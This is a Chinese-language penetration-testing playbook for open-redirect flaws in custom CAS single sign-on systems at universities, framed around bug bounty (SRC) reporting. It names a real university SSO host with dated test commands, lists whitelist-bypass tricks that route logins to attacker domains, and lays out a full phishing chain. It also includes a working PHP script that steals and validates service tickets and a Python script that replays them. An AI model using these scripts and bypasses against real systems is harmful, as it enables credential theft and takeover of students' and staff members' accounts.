# 自定义CAS系统Open Redirect测试模式 (非金智教育authserver)

## 概述
部分高校使用自定义CAS系统(非wisedu authserver)，路径通常为 `/cas/login` 而非 `/authserver/login`。
这些系统可能有不同的白名单验证逻辑，需要专门的测试方法。

## 识别方法
```bash
# 检查是否为自定义CAS
curl -sk 'https://sso.{domain}/cas/login' | head -20
# 特征: /cas/login路径, 可能使用zftal-ui或其他UI框架

# 与wisedu CAS的区别
# wisedu: /authserver/login, Server: wisedu, encrypt.js
# 自定义: /cas/login, 可能使用不同UI框架
```

## 核心漏洞: Form Action反射型Open Redirect

### 验证方法 (关键!)
不同于wisedu CAS将service注入到JS变量，自定义CAS可能将service注入到form action属性:

```bash
# 检查form action是否反射service参数
curl -sk 'https://sso.{domain}/cas/login?service=http://evil.com/' | grep 'action='
# 返回: action="/cas/login?service=http://evil.com/" ← 漏洞存在
# 返回: action="/cas/login" (无service) ← 可能已修复或不同实现
```

### gxnu.edu.cn实战验证 (2026-06-09)
```bash
# 1. 基本测试 - 任意域名被接受
curl -sk 'https://sso.gxnu.edu.cn/cas/login?service=http://ehall.gxnu.edu.cn.attacker.com/steal' | grep 'action='
# 返回: action="/cas/login?service=http://ehall.gxnu.edu.cn.attacker.com/steal"

# 2. serviceValidate也接受恶意域名
curl -sk 'https://sso.gxnu.edu.cn/cas/serviceValidate?service=http://ehall.gxnu.edu.cn.attacker.com&ticket=ST-test'
# 返回: 正常CAS XML响应 (非"未授权服务"错误)

# 3. 被拦截的域名 (白名单验证存在)
curl -sk 'https://sso.gxnu.edu.cn/cas/login?service=https://evil.com/steal' | grep '未认证授权服务'
# 返回: "未认证授权服务" ← 白名单验证生效
```

## 白名单绕过技术

### 1. 子域名拼接绕过
```bash
# 原理: 白名单检查是否包含合法域名字符串，而非精确匹配
# http://ehall.gxnu.edu.cn.attacker.com 包含 "ehall.gxnu.edu.cn"
curl -sk 'https://sso.{domain}/cas/login?service=http://{合法子域}.{攻击者域名}' | grep 'action='
```

### 2. 用户信息字段绕过
```bash
# 原理: URL中的@前面是用户信息，不影响域名解析
# http://ehall.gxnu.edu.cn@evil.com 实际访问evil.com
curl -sk 'https://sso.{domain}/cas/login?service=http://{合法域名}@{攻击者域名}' | grep 'action='
```

### 3. 路径包含绕过
```bash
# 原理: 检查路径中是否包含合法域名
curl -sk 'https://sso.{domain}/cas/login?service=http://evil.com/{合法域名}' | grep 'action='
```

## 完整攻击链

### 钓鱼攻击流程
1. 攻击者构造恶意CAS链接: `https://sso.{domain}/cas/login?service=http://{合法子域}.{攻击者域名}/steal`
2. 发送给目标用户(邮件/消息)
3. 用户点击后看到真实CAS登录页面(域名显示为sso.{domain})
4. 用户输入账号密码登录
5. CAS认证成功后重定向到攻击者域名，携带ticket参数
6. 攻击者服务器捕获ticket
7. 攻击者使用ticket访问所有CAS保护的系统

### Ticket窃取脚本 (PHP)
```php
<?php
$ticket = $_GET['ticket'];
if ($ticket) {
    $log = date('Y-m-d H:i:s') . " | Ticket: $ticket | IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
    file_put_contents('stolen_tickets.log', $log, FILE_APPEND);
    
    // 验证ticket并获取用户信息
    $service = 'http://ehall.{domain}';
    $url = "https://sso.{domain}/cas/serviceValidate?service=$service&ticket=$ticket";
    $response = file_get_contents($url);
    
    if (strpos($response, 'authenticationSuccess') !== false) {
        preg_match('/<cas:user>(.*?)<\/cas:user>/', $response, $matches);
        $username = $matches[1] ?? 'unknown';
        $log = date('Y-m-d H:i:s') . " | User: $username | Ticket: $ticket | VALID\n";
        file_put_contents('valid_tickets.log', $log, FILE_APPEND);
    }
    
    // 重定向到真实服务，用户不察觉
    header("Location: http://ehall.{domain}");
    exit();
}
echo "页面不存在或已过期";
?>
```

### Ticket使用脚本 (Python)
```python
import requests
import re

def use_ticket(ticket, service='http://ehall.{domain}'):
    # 验证ticket
    url = f"https://sso.{domain}/cas/serviceValidate?service={service}&ticket={ticket}"
    resp = requests.get(url, verify=False)
    
    if 'authenticationSuccess' in resp.text:
        user = re.search(r'<cas:user>(.*?)</cas:user>', resp.text).group(1)
        print(f"[+] Valid ticket for user: {user}")
        
        # 使用ticket访问服务
        session = requests.Session()
        resp = session.get(f"{service}?ticket={ticket}", verify=False, allow_redirects=False)
        print(f"[+] Status: {resp.status_code}, Location: {resp.headers.get('Location', 'N/A')}")
        return session
    else:
        print("[-] Invalid ticket")
        return None
```

## 受影响系统范围
CAS Open Redirect影响所有通过CAS认证的系统:
- ehall (办事大厅) - 学生信息、成绩、课程
- mail (邮箱) - 邮件内容
- office (OA) - 内部文档
- hr (人事) - 教职工信息
- webvpn (VPN) - 内网访问
- ydjk (一卡通) - 消费记录

## 与wisedu CAS的区别

| 特征 | wisedu CAS | 自定义CAS |
|------|-----------|----------|
| 路径 | /authserver/login | /cas/login |
| Server | wisedu | nginx/其他 |
| service注入位置 | JS变量 (var service) | form action属性 |
| 白名单验证 | 通常无 | 可能有(可绕过) |
| 绕过技术 | 直接注入 | 子域名拼接/用户信息字段 |

## SRC提交要点
- **标题**: "xxx学校统一身份认证系统存在URL跳转漏洞可窃取用户凭证"
- **等级**: 高危 (可窃取凭证访问所有下游系统)
- **关键证明**: 展示form action包含恶意域名 + 完整攻击链
- **影响范围**: 全校师生 + 所有CAS接入系统
